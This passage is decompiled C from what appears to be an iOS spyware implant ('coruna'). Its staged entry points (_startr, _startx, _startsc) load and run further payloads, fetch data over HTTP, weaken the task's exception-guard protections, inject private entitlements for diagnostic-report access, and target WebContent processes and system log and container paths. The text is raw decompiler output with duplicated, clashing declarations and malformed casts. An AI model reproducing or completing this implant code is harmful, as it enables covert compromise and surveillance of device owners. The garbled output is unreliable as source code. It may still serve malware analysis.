            err = 0xe6a;
            goto done;
          }
        }
        else {
          tmp_buf = (void (*)0x0;
          region = 0;
          u = coruna_implant_residual_39(work[0],0x80000,"_startl",&region,&tmp_buf);
          if ((int)u == 0) {
            u = (*tmp_buf)(val,plist);
            if ((int)u == 0) {
              if ((*(char *)((long)val + 0x5c6) == '\0') ||
                 ((**(void (**)(work[0] + 0x60))(work[0],region),
                 *(char *)((long)val + 0x5c6) == '\0')) {
                u = 0;
                goto cleanup;
              }
              u = 0;
            }
            else {
              (**(void (**)(work[0] + 0x60))(work[0],region);
            }
          }
          else if ((*(char *)((long)val + 0x5eb) != '\0') &&
                  ((void (*)val[0xbe] != (void (*)0x0)) {
            (*(void (*)val[0xbe])(val,u,0,0x730c4e4b);
          }
          (**(void (**)(plist + 8))();
          if (((int)u == 0) && (*(char *)((long)val + 0x5c6) == '\0')) goto cleanup;
        }
      }
      else if ((*(char *)((long)val + 0x5eb) != '\0') &&
              (ptr = (void (*)val[0xbe], ptr != (void (*)0x0)) {
        err = 0xe68;
done:
        (*ptr)(val,u,0,err + 0x730c404e);
      }
      (**(void (**)(work[0] + 0x60))(work[0],json_buf);
    }
    else if ((*(char *)((long)val + 0x5eb) != '\0') &&
            (ptr = (void (*)val[0xbe], ptr != (void (*)0x0)) {
      err = 0xe5c;
      goto check_ok;
    }
  }
  else if ((*(char *)((long)val + 0x5eb) != '\0') &&
          (ptr = (void (*)val[0xbe], ptr != (void (*)0x0)) {
    err = 0xe52;
check_ok:
    (*ptr)(val,u,0,err + 0x730c404e);
  }
cleanup:
  coruna_implant08_via_implant_residual_46(work[0],val);
fail:
  if ((*(char *)((long)val + 0x5eb) != '\0') && ((void (*)val[0xbe] != (void (*)0x0)) {
    (*(void (*)val[0xbe])(val,u,0,0x730c404e);
  }
  if (*(char *)((long)val + 0x5c2) == '\0') {
    val[0x16] = path_buf;
    val[6] = scratch;
    val[7] = sa_saved;
    val[0x25] = sa_new;
    val[0x26] = stack_guard;
    val[0x1d] = serial_buf;
    val[0x1e] = bootargs;
    val[0x1f] = thread_attr;
    val[0x20] = scratch;
    val[0x23] = type_id_8;
    val[0x24] = action;
    val[0x21] = host_info;
    val[0x22] = 0;
    *val = port;
    val[1] = size;
    val[2] = version;
    val[3] = tag;
    val[4] = kind;
    val[5] = block_ctx;
    val[0xbe] = type_id;
  }
  return u;
}





uint64_t _startr(short *arg)
{
  bool err;
  short *lps2;
  uint64_t u;
  uint scratch;
  int *bootargs;
  
  u = 0xad001;
  if ((((arg != (short *)0x0) && (*arg == 1)) && (arg[1] != 0)) &&
     (((lps2 = *(short **)(arg + 0x1c), lps2 != (short *)0x0 && (*lps2 == 1)) &&
      (lps2[1] != 0)))) {
    bootargs = (int *)0x0;
    scratch = 0;
    u = (**(void (**)(lps2 + 0xc))(lps2,0x70005,&bootargs,&scratch);
    if ((int)u == 0) {
      if (bootargs == (int *)0x0) {
        return 0xad001;
      }
      if (scratch == 0) {
        return 0xad001;
      }
      if (scratch < 0x18) {
        return 0xad014;
      }
      if (*bootargs != -0x21522ff1) {
        return 0xad014;
      }
      err = (char)bootargs[1] != '\0';
    }
    else {
      if ((int)u != 0x7003) {
        return u;
      }
      err = false;
    }
    u = coruna_run_startx(arg,err,1);
  }
  return u;
}
unsigned long coruna_run_startx(short *arg,uint val,int n)

{
  uint32_t u;
  uint size;
  char *ptr;
  unsigned long version;
  uint port;
  short *lps6;
  unsigned long kind;
  short *lps8;
  unsigned long type_id;
  short *lps10;
  long stack_guard;
  short *sa_saved;
  void *sa_new;
  unsigned long path_buf;
  char *tmp_buf;
  char region [8];
  long plist;
  long url_buf;
  unsigned long json_buf;
  uint32_t frame;
  uint64_t scratch;
  uint32_t work;
  unsigned long thread_attr;
  unsigned long host_info;
  uint64_t scratch;
  char *action;
  uint64_t cache;
  unsigned long cache_20;
  
  type_id = 0xad001;
  if ((((((arg == (short *)0x0) || (*arg != 1)) || (arg[1] == 0)) ||
       (((lps8 = *(short **)(arg + 0x14), lps8 == (short *)0x0 || (*lps8 != 3)) ||
        ((lps8[1] == 0 ||
         ((lps6 = *(short **)(arg + 0x18), lps6 == (short *)0x0 || (*lps6 != 2)))))))) ||
      ((ushort)lps6[1] < 2)) ||
     (((sa_saved = *(short **)(arg + 0x1c), sa_saved == (short *)0x0 || (*sa_saved != 1)) ||
      (sa_saved[1] == 0)))) {
    return 0xad001;
  }
  region[0] = '\0';
  region[1] = '\0';
  region[2] = '\0';
  region[3] = '\0';
  region[4] = '\0';
  region[5] = '\0';
  region[6] = '\0';
  region[7] = '\0';
  plist = 0;
  url_buf = 0;
  stack_guard = 0;
  sa_new = (void *)0x0;
  path_buf = 0;
  tmp_buf = region;
  if (((val & 1) != 0) || (n != 0)) {
    if (*(double *)k_implant_dyldversionnumber_slot < k_implant_rodata_word_1e840) {
      region[0] = (char)val;
    }
    else if (*(void (**)(void))(lps6 + 0x20) != (void (*)0x0) {
      scratch = k_implant_rodata_word_0001e858;
      host_info = k_implant_rodata_word_1e850;
      kind = (**(void (**)(void))(lps6 + 0x20))(lps6,&stack_guard,&host_info,1,0);
      if (stack_guard != 0) {
      (**(void (**)(void))(lps6 + 0x18))();
      (**(void (**)(void))(lps6 + 0x10))(lps6,stack_guard);
      }
      return kind;
    }
    else {
      kind = 0xad001;
      if (stack_guard != 0) {
      (**(void (**)(void))(lps6 + 0x18))();
      (**(void (**)(void))(lps6 + 0x10))(lps6,stack_guard);
      }
      return kind;
    }
  }
  if (val == 0) {
    if (n != 0) {
nomem:
      if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
        coruna_call_parse_https_url(tmp_buf,0xcc10a,0x730c4207);
      }
      cache_20 = 0;
      scratch = (unsigned long)scratch << 0x20;
      kind = (**(void (**)(sa_saved + 0xc))(sa_saved,0x70001,&cache_20,&scratch);
      if ((int)kind == 0) {
        cache = 0;
        json_buf = json_buf & 0xffffffff00000000;
        port = (**(void (**)(sa_saved + 0xc))(sa_saved,0x70004,&cache,&json_buf);
        size = 0;
        if (port != 0x7003) {
          size = port;
        }
        kind = (unsigned long)size;
        if (size == 0) {
          kind = coruna_cfhttpmessagesetheaderfieldvalue(cache_20,cache,0,0,&sa_new,&path_buf);
          if ((int)kind == 0) {
            host_info = 0;
            thread_attr = thread_attr & 0xffffffff00000000;
            kind = (**(void (**)(sa_saved + 0xc))(sa_saved,0x70002,&host_info,&thread_attr);
            while ((int)kind == 0x7003 || (int)kind == 0) {
              if ((int)kind == 0x7003) {
                kind = coruna_compression_decode_buffer(&sa_new,&path_buf);
              }
              else {
                coruna_implant65fc_via_u64_pack(host_info,sa_new,path_buf & 0xffffffff);
                kind = (**(void (**)(sa_saved + 0xc))(sa_saved,0x70002,&host_info,&thread_attr);
              }
            }
            if ((int)kind == 0) {
              kind = (**(void (**)(sa_saved + 8))(sa_saved,sa_new,path_buf & 0xffffffff);
              if ((int)kind != 0) {
                if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
                  coruna_call_parse_https_url(tmp_buf,kind,0x730c4277);
                }
                _bzero(sa_new,path_buf & 0xffffffff);
                _free(sa_new);
                sa_new = (void *)0x0;
                path_buf = path_buf & 0xffffffff00000000;
              }
              if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
                coruna_call_parse_https_url(tmp_buf,0xcc10b,0x730c4263);
              }
            }
            else {
              _bzero(sa_new,path_buf & 0xffffffff);
              _free(sa_new);
              sa_new = (void *)0x0;
              path_buf = path_buf & 0xffffffff00000000;
              if (tmp_buf != (char *)0x0) {
                if (*tmp_buf != '\0') {
                  coruna_call_parse_https_url(tmp_buf,kind,0x730c4260);
                }
                if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
                  coruna_call_parse_https_url(tmp_buf,0xcc10b,0x730c4263);
                }
              }
            }
          }
          else if (tmp_buf != (char *)0x0) {
            if (*tmp_buf != '\0') {
              coruna_call_parse_https_url(tmp_buf,kind,0x730c4260);
            }
            if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
              coruna_call_parse_https_url(tmp_buf,0xcc10b,0x730c4263);
            }
          }
        }
        else if (tmp_buf != (char *)0x0) {
          if (*tmp_buf != '\0') {
            coruna_call_parse_https_url(tmp_buf,kind,0x730c4260);
          }
          if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
            coruna_call_parse_https_url(tmp_buf,0xcc10b,0x730c4263);
          }
        }
      }
      if ((int)kind != 0) {
        if (((region[0] != '\0') && (url_buf != 0)) && (plist != 0)) {
          coruna_parse_https_url(url_buf,plist,kind,0,0x730c452e);
        }
        if (stack_guard != 0) {
        (**(void (**)(lps6 + 0x18))();
        (**(void (**)(lps6 + 0x10))(lps6,stack_guard);
        }
        return kind;
      }
    }
  }
  else {
    lps10 = *(short **)(arg + 0x1c);
    kind = 0xad001;
    if (stack_guard != 0) {
    (**(void (**)(lps6 + 0x18))();
    (**(void (**)(lps6 + 0x10))(lps6,stack_guard);
    }
    return kind;
  }
  if (((region[0] != '\0') && (url_buf != 0)) && (plist != 0)) {
    coruna_parse_https_url(url_buf,plist,0xcc10c,0,0x730c4522);
  }
  thread_attr = 0;
  work = 0;
  scratch = 0;
  frame = 0;
  port = (**(void (**)(sa_saved + 0xc))(sa_saved,0x70003,&thread_attr,&work);
  size = 0;
  if (port != 0x7003) {
    size = port;
  }
  kind = (unsigned long)size;
  if (((size == 0) &&
      (kind = (**(void (**)(sa_saved + 0xc))(sa_saved,0x70004,&scratch,&frame),
      (int)kind == 0x7003)) || ((int)kind == 0)) {
    json_buf = 0;
    kind = coruna_strdup_2(&json_buf,sa_saved,lps6,lps8,thread_attr,scratch);
    version = json_buf;
    ptr = tmp_buf;
    if ((int)kind == 0) {
      if (json_buf == 0) {
        if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
          coruna_call_parse_https_url(tmp_buf,type_id,0x730c4ca9);
        }
      }
      else {
        cache = 0;
        cache_20 = 0;
        type_id = coruna_implant65fc_residual_86(json_buf,0x10000,"_startx",&cache_20,&cache);
        if ((int)type_id == 0) {
          host_info = version;
          scratch = cache;
          action = ptr;
          type_id = coruna_pthread_attr_setdetachstate(coruna_implant65fc_via_call_parse_https_url,&host_info);
          if ((((int)type_id != 0) && (ptr != (char *)0x0)) && (*ptr != '\0')) {
            coruna_call_parse_https_url(ptr,type_id,0x730c4cba);
          }
          (**(void (**)(version + 0x60))(version,cache_20);
        }
        else if ((ptr != (char *)0x0) && (*ptr != '\0')) {
          coruna_call_parse_https_url(ptr,type_id,0x730c4cb3);
        }
      }
      coruna_implant65fc_via_ctx_free_9e78_2(json_buf);
    }
    else {
      type_id = kind;
      if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
        coruna_call_parse_https_url(tmp_buf,kind,0x730c4316);
      }
    }
  }
  else {
    type_id = kind;
    if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
      coruna_call_parse_https_url(tmp_buf,kind,0x730c430d);
      type_id = kind;
    }
  }
  if (((((int)type_id != 0) && (region[0] != '\0')) && (url_buf != 0)) && (plist != 0)) {
    coruna_parse_https_url(url_buf,plist,type_id,0,0x730c4510);
  }
  kind = type_id;
  if (sa_new != (void *)0x0) {
    if ((int)path_buf != 0) {
      _bzero(sa_new,path_buf & 0xffffffff);
      _free(sa_new);
      sa_new = (void *)0x0;
      path_buf = path_buf & 0xffffffff00000000;
    }
  }
retry:
  if (stack_guard != 0) {
    (**(void (**)(lps6 + 0x18))();
    (**(void (**)(lps6 + 0x10))(lps6,stack_guard);
  }
  return kind;
}





void _startm(uint64_t val)
{
  coruna_run_startx(val,0,0);
  return;
}





uint64_t coruna_startl_thread(long *handle)
{
  uint64_t u;
  uint64_t scratch;
  
  if ((k_implant_rodata_word_2c723 != '\0') && (k_implant_rodata_word_2c728 != (void (*)0x0)) {
    (*k_implant_rodata_word_2c728)(&k_implant_rodata_word_2c138,0xcc106,0,0x730c4cf0);
  }
  if ((((handle == (long *)0x0) || (*handle == 0)) || (handle[2] == 0)) || ((int)handle[3] == 0)
     ) {
    if (k_implant_rodata_word_2c718 != (uint32_t *)0x0) {
    *k_implant_rodata_word_2c718 = 5;
    }
    return 0;
    (*k_implant_rodata_word_2c728)(&k_implant_rodata_word_2c138,0xad001,0,0x730c4f27);
  }
  else {
    scratch = 0;
    u = coruna_bzero_3(&scratch);
    if ((int)u == 0) {
      u = coruna_run_startsc(&k_implant_rodata_word_2c138,scratch,0);
      if ((((int)u != 0) && (k_implant_rodata_word_2c723 != '\0')) && (k_implant_rodata_word_2c728 != (void (*)0x0)) {
        (*k_implant_rodata_word_2c728)(&k_implant_rodata_word_2c138,u,0,0x730c4ccc);
      }
      coruna_find_objc_methlist(scratch);
      scratch = 0;
    }
    else if ((k_implant_rodata_word_2c723 != '\0') && (k_implant_rodata_word_2c728 != (void (*)0x0)) {
      (*k_implant_rodata_word_2c728)(&k_implant_rodata_word_2c138,u,0,0x730c4cc6);
    }
    if ((char)handle[1] != '\0') {
      (**(void (**)(*handle + 0x10))();
    }
    _memset_s(handle[2],(int)handle[3],0,(int)handle[3]);
    _free((void *)handle[2]);
    if (handle[4] != 0) {
      coruna_free_secure_str();
    }
    if (handle[5] != 0) {
      coruna_free_secure_str();
    }
    if (handle[6] != 0) {
      coruna_free_secure_str();
    }
    _memset_s(handle,0x38,0,0x38);
    _free(handle);
  }
  if ((k_implant_rodata_word_2c723 != '\0') && (k_implant_rodata_word_2c728 != (void (*)0x0)) {
    (*k_implant_rodata_word_2c728)(&k_implant_rodata_word_2c138,0xcc107,0,0x730c4f22);
  }
code_r0x000096dc:
  if (k_implant_rodata_word_2c718 != (uint32_t *)0x0) {
    *k_implant_rodata_word_2c718 = 5;
  }
  return 0;
}





unsigned long coruna_run_startsc(long arg,long val,long n)

{
  uint32_t u;
  uint32_t *ptr;
  uint64_t type_id_8;
  uint version;
  char err;
  bool err;
  uint8_t *buf;
  uint8_t *str;
  bool status;
  uint type_id_9;
  int status;
  void (*buf)(void);
  long handle;
  long addr;
  unsigned long type_id_10;
  unsigned long type_id_11;
  unsigned long type_id_12;
  uint64_t cache_21;
  uint64_t bootargs;
  uint64_t cache_22;
  uint64_t thread_attr;
  uint64_t cache_23;
  char *cache_24;
  long cache_25;
  void (*cache_26)(void);
  uint cache_27;
  char *cache_28;
  char scratch [8];
  char bootargs [8];
  uint64_t host_info;
  char cache_29;
  uint64_t serial_buf;
  char cache_30;
  uint64_t action;
  char cache_31;
  char thread_attr [8];
  char host_info [8];
  char cache_32 [8];
  char serial_buf [7];
  char cache_33;
  char action [7];
  uint8_t cache_34[936];
  uint8_t cache_35;
  mach_port_name_t cache_36;
  uint64_t host_info;
  
  cache_25 = n;
  if (arg == 0) {
    if (val == 0) {
      return 0xad001;
    }
load_ok_15:
    bootargs = 0;
    thread_attr = 0;
    cache_21 = 8;
    cache_22 = 10;
    cache_24 = 
    "<dict><key>com.apple.private.webbookmarks.settings</key><true/><key>com.apple.private.security.storage.DiagnosticReports.read-write</key><true/></dict>"
    ;
    cache_23 = 0x40000004;
    type_id_10 = (**(void (**)(val + 0x80))(val,&cache_25,&cache_21,3,0);
    str = k_implant_task_set_exc_guard_behavior_slot;
    buf = k_implant_mach_task_self_slot;
    if ((int)type_id_10 == 0) {
      if (k_implant_task_get_exc_guard_behavior_slot == (uint8_t *)0x0 ||
          k_implant_task_set_exc_guard_behavior_slot == (uint8_t *)0x0) {
        status = false;
        type_id_11 = 0;
load_ok_16:
        handle = cache_25;
        cache_28 = (char *)0x0;
        type_id_10 = coruna_implant65fc_residual_85(val,&cache_28);
        if (((int)type_id_10 == 0) && ((char)cache_28 == '\0')) {
          host_info = (char *)0x0;
          cache_26 = (void (*)0x0;
          type_id_9 = coruna_implant65fc_residual_86(val,0xa0000,"_startsc",&host_info,&cache_26);
          if (type_id_9 == 0) {
            type_id_10 = (*cache_26)(val,handle,&cache_28);
            (**(void (**)(val + 0x60))(val,host_info);
          }
          else {
            version = 0;
            if (type_id_9 != 0x7003) {
              version = type_id_9;
            }
            type_id_10 = (unsigned long)version;
          }
        }
        host_info = (char *)((unsigned long)host_info & 0xffffffff00000000);
        (**(void (**)(val + 0xe0))(val,0xa0000,&host_info,4);
        if ((int)type_id_10 == 0) {
          do {
            if (k_implant_rodata_word_24c98 != '\0') {
              type_id_10 = 0;
              ClearExclusiveLocal();
              break;
            }
            err = '\x01';
            err = (bool)coruna_ldrex_pass(0x24c98,0x10);
            if (err) {
              k_implant_rodata_word_24c98 = '\x01';
              err = coruna_ldrexp_clear();
            }
          } while (err != '\0');
          if (((arg != 0) && (*(char *)(arg + 0x5eb) != '\0')) &&
             (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
            (**(void (**)(arg + 0x5f0))(arg,0xcc108,0,0x730c4a49);
          }
          cache_28 = (char *)0x0;
          cache_26 = (void (*)((unsigned long)cache_26 & 0xffffffff00000000);
          type_id_10 = (**(void (**)(val + 0x68))(val,0x80000,&cache_28,&cache_26);
          if ((int)type_id_10 == 0) {
            host_info = (char *)0x0;
            type_id_10 = coruna_implant65fc_residual_87(&host_info,val);
            if ((int)type_id_10 == 0) {
              if (*(int *)((long)host_info + 0x14) == 0) {
                type_id_10 = 0;
              }
              else {
                type_id_12 = 0;
                type_id_10 = 0;
                handle = (long)host_info;
                do {
                  if (*(int *)(handle + 0x10) != 0) {
                    type_id_9 = 0;
                    do {
                      cache_36 = 0;
                      addr = handle + type_id_12 * 0xc;
                      status = *(int *)(addr + 0x18);
                      ptr = (uint32_t *)(handle + (unsigned long)*(uint *)(addr + 0x1c));
                      type_id_10 = 0xad014;
                      if (status - 2U < 2) {
                        if (*(char *)((long)ptr +
                                     (unsigned long)(*(int *)(handle + type_id_12 * 0xc + 0x20) - 1)) == '\0') {
                          type_id_8 = 1;
                          if (status != 3) {
                            type_id_8 = 2;
                          }
                          type_id_10 = (**(void (**)(val + 0xf8))
                                             (val,ptr,type_id_8,cache_28,
                                              (unsigned long)cache_26 & 0xffffffff,"_startr",0,0,&cache_36)
                          ;
                          if ((int)type_id_10 == 0) {
                            if (*(int *)((long)host_info + 0xc) == 0) {
load_ok_19:
                              type_id_10 = 0;
                            }
                            else {
                              cache_27 = 0xad000;
                              type_id_10 = (**(void (**)(val + 0x100))
                                                 (val,cache_36,*(int *)((long)host_info + 0xc),
                                                  &cache_27);
                              if ((int)type_id_10 == 0x1e02a) {
                                type_id_10 = 0;
                              }
                              if ((int)type_id_10 == 0) {
                                type_id_10 = (unsigned long)cache_27;
                              }
                              else if (((arg != 0) && (*(char *)(arg + 0x5eb) != '\0')) &&
                                      (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
                                (**(void (**)(arg + 0x5f0))(arg,type_id_10,0,0x730c4ac6);
                              }
                            }
                            _mach_port_mod_refs(*(ipc_space_t *)k_implant_mach_task_self_slot,
                                                cache_36,1,-1);
                            goto load_ok_17;
                          }
                        }
                      }
                      else if (status == 1) {
                        if (*(int *)(handle + type_id_12 * 0xc + 0x20) == 4) {
                          type_id_10 = (**(void (**)(val + 0xf0))
                                             (val,*ptr,cache_28,
                                              (unsigned long)cache_26 & 0xffffffff,"_startr",0,0,&cache_36)
                          ;
                        }
                        else {
                          type_id_10 = 0xad014;
                        }
                      }
                      if (((arg != 0) && (*(char *)(arg + 0x5eb) != '\0')) &&
                         (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
                        (**(void (**)(arg + 0x5f0))(arg,type_id_10,0,0x730c4d37);
                      }
                      type_id_9 = type_id_9 + 1;
                      handle = (long)host_info;
                    } while (type_id_9 < *(uint *)((long)host_info + 0x10));
                  }
                  type_id_12 = type_id_12 + 1;
                } while (type_id_12 < *(uint *)(handle + 0x14));
              }
            }
          }
        }
load_ok_17:
        host_info = (char *)0x0;
        status = coruna_implant65fc_residual_85(val,&host_info);
        if ((status == 0) && ((char)host_info == '\0')) {
          _bzero(&cache_31,0x3d0);
          scratch[0] = s__private_var_mobile_Library_Logs_0001ea09[8];
          scratch[1] = s__private_var_mobile_Library_Logs_0001ea09[9];
          scratch[2] = s__private_var_mobile_Library_Logs_0001ea09[10];
          scratch[3] = s__private_var_mobile_Library_Logs_0001ea09[0xb];
          scratch[4] = s__private_var_mobile_Library_Logs_0001ea09[0xc];
          scratch[5] = s__private_var_mobile_Library_Logs_0001ea09[0xd];
          scratch[6] = s__private_var_mobile_Library_Logs_0001ea09[0xe];
          scratch[7] = s__private_var_mobile_Library_Logs_0001ea09[0xf];
          cache_28 = (char *)0;
          host_info = s__private_var_mobile_Library_Logs_0001ea09[0x18];
          host_info = s__private_var_mobile_Library_Logs_0001ea09[0x19];
          host_info = s__private_var_mobile_Library_Logs_0001ea09[0x1a];
          host_info = s__private_var_mobile_Library_Logs_0001ea09[0x1b];
          host_info = s__private_var_mobile_Library_Logs_0001ea09[0x1c];
          host_info = s__private_var_mobile_Library_Logs_0001ea09[0x1d];
          host_info = s__private_var_mobile_Library_Logs_0001ea09[0x1e];
          bootargs[0] = s__private_var_mobile_Library_Logs_0001ea09[0x10];
          bootargs[1] = s__private_var_mobile_Library_Logs_0001ea09[0x11];
          bootargs[2] = s__private_var_mobile_Library_Logs_0001ea09[0x12];
          bootargs[3] = s__private_var_mobile_Library_Logs_0001ea09[0x13];
          bootargs[4] = s__private_var_mobile_Library_Logs_0001ea09[0x14];
          bootargs[5] = s__private_var_mobile_Library_Logs_0001ea09[0x15];
          bootargs[6] = s__private_var_mobile_Library_Logs_0001ea09[0x16];
          bootargs[7] = s__private_var_mobile_Library_Logs_0001ea09[0x17];
          cache_30 = (char)0;
          action = SUB87(0,1);
          cache_29 = s__private_var_mobile_Library_Logs_0001ea09[0x1f];
          serial_buf = s__private_var_mobile_Library_Logs_0001ea09[0x20];
          serial_buf = s__private_var_mobile_Library_Logs_0001ea09[0x21];
          serial_buf = s__private_var_mobile_Library_Logs_0001ea09[0x22];
          serial_buf = s__private_var_mobile_Library_Logs_0001ea09[0x23];
          serial_buf = s__private_var_mobile_Library_Logs_0001ea09[0x24];
          serial_buf = s__private_var_mobile_Library_Logs_0001ea09[0x25];
          serial_buf = s__private_var_mobile_Library_Logs_0001ea09[0x26];
          cache_35 = 0;
          coruna_find_webcontent(&cache_28,host_info);
          _bzero(cache_34,0x3a8);
          action = (uint64_t)0;
          cache_31 = SUB81(0,7);
          serial_buf = (uint64_t)0;
          cache_30 = SUB81(0,7);
          host_info[0] = s__var_containers_Shared_SystemGro_0001ea38[0x38];
          host_info[1] = s__var_containers_Shared_SystemGro_0001ea38[0x39];
          host_info[2] = s__var_containers_Shared_SystemGro_0001ea38[0x3a];
          host_info[3] = s__var_containers_Shared_SystemGro_0001ea38[0x3b];
          host_info[4] = s__var_containers_Shared_SystemGro_0001ea38[0x3c];
          host_info[5] = s__var_containers_Shared_SystemGro_0001ea38[0x3d];
          host_info[6] = s__var_containers_Shared_SystemGro_0001ea38[0x3e];
          host_info[7] = s__var_containers_Shared_SystemGro_0001ea38[0x3f];
          thread_attr[0] = s__var_containers_Shared_SystemGro_0001ea38[0x30];
          thread_attr[1] = s__var_containers_Shared_SystemGro_0001ea38[0x31];
          thread_attr[2] = s__var_containers_Shared_SystemGro_0001ea38[0x32];
          thread_attr[3] = s__var_containers_Shared_SystemGro_0001ea38[0x33];
          thread_attr[4] = s__var_containers_Shared_SystemGro_0001ea38[0x34];
          thread_attr[5] = s__var_containers_Shared_SystemGro_0001ea38[0x35];
          thread_attr[6] = s__var_containers_Shared_SystemGro_0001ea38[0x36];
          thread_attr[7] = s__var_containers_Shared_SystemGro_0001ea38[0x37];
          serial_buf[0] = s__var_containers_Shared_SystemGro_0001ea38[0x48];
          serial_buf[1] = s__var_containers_Shared_SystemGro_0001ea38[0x49];
          serial_buf[2] = s__var_containers_Shared_SystemGro_0001ea38[0x4a];
          serial_buf[3] = s__var_containers_Shared_SystemGro_0001ea38[0x4b];
          serial_buf[4] = s__var_containers_Shared_SystemGro_0001ea38[0x4c];
          serial_buf[5] = s__var_containers_Shared_SystemGro_0001ea38[0x4d];
          serial_buf[6] = s__var_containers_Shared_SystemGro_0001ea38[0x4e];
          cache_32[0] = s__var_containers_Shared_SystemGro_0001ea38[0x40];
          cache_32[1] = s__var_containers_Shared_SystemGro_0001ea38[0x41];
          cache_32[2] = s__var_containers_Shared_SystemGro_0001ea38[0x42];
          cache_32[3] = s__var_containers_Shared_SystemGro_0001ea38[0x43];
          cache_32[4] = s__var_containers_Shared_SystemGro_0001ea38[0x44];
          cache_32[5] = s__var_containers_Shared_SystemGro_0001ea38[0x45];
          cache_32[6] = s__var_containers_Shared_SystemGro_0001ea38[0x46];
          cache_32[7] = s__var_containers_Shared_SystemGro_0001ea38[0x47];
          cache_33 = s__var_containers_Shared_SystemGro_0001ea38[0x4f];
          action[0] = s__var_containers_Shared_SystemGro_0001ea38[0x50];
          action[1] = s__var_containers_Shared_SystemGro_0001ea38[0x51];
          action[2] = s__var_containers_Shared_SystemGro_0001ea38[0x52];
          action[3] = s__var_containers_Shared_SystemGro_0001ea38[0x53];
          action[4] = s__var_containers_Shared_SystemGro_0001ea38[0x54];
          action[5] = s__var_containers_Shared_SystemGro_0001ea38[0x55];
          action[6] = s__var_containers_Shared_SystemGro_0001ea38[0x56];
          scratch[0] = s__var_containers_Shared_SystemGro_0001ea38[8];
          scratch[1] = s__var_containers_Shared_SystemGro_0001ea38[9];
          scratch[2] = s__var_containers_Shared_SystemGro_0001ea38[10];
          scratch[3] = s__var_containers_Shared_SystemGro_0001ea38[0xb];
          scratch[4] = s__var_containers_Shared_SystemGro_0001ea38[0xc];
          scratch[5] = s__var_containers_Shared_SystemGro_0001ea38[0xd];
          scratch[6] = s__var_containers_Shared_SystemGro_0001ea38[0xe];
          scratch[7] = s__var_containers_Shared_SystemGro_0001ea38[0xf];
          cache_28 = (char *)0;
          host_info = (uint64_t)0;
          cache_29 = SUB81(0,7);
          bootargs[0] = s__var_containers_Shared_SystemGro_0001ea38[0x10];
          bootargs[1] = s__var_containers_Shared_SystemGro_0001ea38[0x11];
          bootargs[2] = s__var_containers_Shared_SystemGro_0001ea38[0x12];
          bootargs[3] = s__var_containers_Shared_SystemGro_0001ea38[0x13];
          bootargs[4] = s__var_containers_Shared_SystemGro_0001ea38[0x14];
          bootargs[5] = s__var_containers_Shared_SystemGro_0001ea38[0x15];
          bootargs[6] = s__var_containers_Shared_SystemGro_0001ea38[0x16];
          bootargs[7] = s__var_containers_Shared_SystemGro_0001ea38[0x17];
          cache_35 = 0;
          coruna_find_webcontent(&cache_28,host_info);
        }
        cache_28 = (char *)0x0;
        cache_26 = (void (*)((unsigned long)cache_26 & 0xffffffff00000000);
        host_info = (char *)0x0;
        cache_36 = 0;
        status = (**(void (**)(val + 0x68))(val,0x70001,&cache_28,&cache_26);
        if ((((status == 0) && ((int)cache_26 != 0)) && (cache_28 != (char *)0x0)) &&
           (*cache_28 != '\0')) {
          coruna_pthread_attr_setdetachstate(coruna_call_objc_opt_respondstoselector);
        }
        status = (**(void (**)(val + 0x68))(val,0x70003,&host_info,&cache_36);
        if (((status == 0) && (cache_36 != 0)) && ((host_info != (char *)0x0 && (*host_info != '\0')))
           ) {
          coruna_pthread_attr_setdetachstate(coruna_call_objc_opt_respondstoselector);
        }
        if ((status) && (str != (uint8_t *)0x0)) {
          _task_set_exc_guard_behavior(*(uint32_t *)k_implant_mach_task_self_slot,type_id_11);
        }
      }
      else {
        cache_28 = (char *)((unsigned long)cache_28 & 0xffffffff00000000);
        type_id_9 = _task_get_exc_guard_behavior
                           (*(uint32_t *)k_implant_mach_task_self_slot,&cache_28);
        if (type_id_9 == 0) {
          type_id_10 = (unsigned long)cache_28 & 0x88;
          if (((unsigned long)cache_28 & 0x88) == 0) {
            type_id_11 = 0;
            status = type_id_10 != 0;
            goto load_ok_16;
          }
          type_id_9 = _task_set_exc_guard_behavior
                             (*(uint32_t *)buf,(uint)cache_28 & 0xffffff77);
          if (type_id_9 == 0) {
            type_id_11 = (unsigned long)cache_28 & 0xffffffff;
            status = type_id_10 != 0;
            goto load_ok_16;
          }
          type_id_10 = (unsigned long)(type_id_9 | 0x80000000);
          if (((arg != 0) && (*(char *)(arg + 0x5eb) != '\0')) &&
             (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
            (**(void (**)(arg + 0x5f0))(arg,type_id_10,0,0x730c4db9);
          }
        }
        else {
          type_id_10 = (unsigned long)(type_id_9 | 0x80000000);
          if (((arg != 0) && (*(char *)(arg + 0x5eb) != '\0')) &&
             (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
            (**(void (**)(arg + 0x5f0))(arg,type_id_10,0,0x730c4db9);
          }
        }
      }
      if (n == 0) {
        (**(void (**)(val + 0x88))(val,cache_25);
        (**(void (**)(val + 0x90))(val,cache_25);
        cache_25 = 0;
      }
      if (arg == 0) {
        return type_id_10;
      }
      if ((*(char *)(arg + 0x5eb) != '\0') && (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
        (**(void (**)(arg + 0x5f0))(arg,0xcc109,0,0x730c4da7);
      }
      return type_id_10;
    }
    if (arg == 0) {
      return type_id_10;
    }
    u = 0x730c4dae;
    if ((*(char *)(arg + 0x5eb) != '\0') &&
        (buf = *(void (**)(arg + 0x5f0), buf != (void (*)0x0)) {
      (*buf)(arg,type_id_10,0,u);
    }
  }
  else {
    if ((*(char *)(arg + 0x5eb) != '\0') && (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
      (**(void (**)(arg + 0x5f0))(arg,0xcc108,0,0x730c4d06);
    }
    if (val != 0) goto load_ok_15;
    type_id_10 = 0xad001;
    u = 0x730c4da4;
